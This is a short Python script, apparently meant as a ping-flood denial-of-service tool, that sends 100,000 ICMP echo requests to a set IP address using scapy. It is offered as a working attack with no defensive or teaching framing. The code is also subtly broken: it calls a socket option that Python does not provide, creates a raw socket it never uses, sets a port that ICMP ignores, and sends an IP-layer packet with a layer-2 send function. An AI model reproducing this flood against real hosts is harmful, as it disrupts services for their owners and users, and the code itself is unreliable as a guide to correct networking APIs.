import socket
from scapy.all import *

# Set the target IP address and port number
target_ip = '192.168.1.100'
port_number = 53

# Create a raw socket with IPPROTO_ICMP
sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)

# Set the source IP address of the packets
sock.setsockopt(socket.IPPROTO_IP, socket.IP_SOURCEADDR, (socket.inet_aton('192.168.1.100'),)) #the ip address of u

# Send a large number of ICMP packets to the target IP address
for i in range(100000):
    packet = IP(dst=target_ip) / ICMP(type=8)
    sendp(packet, verbose=False)

# Close the raw socket
sock.close()
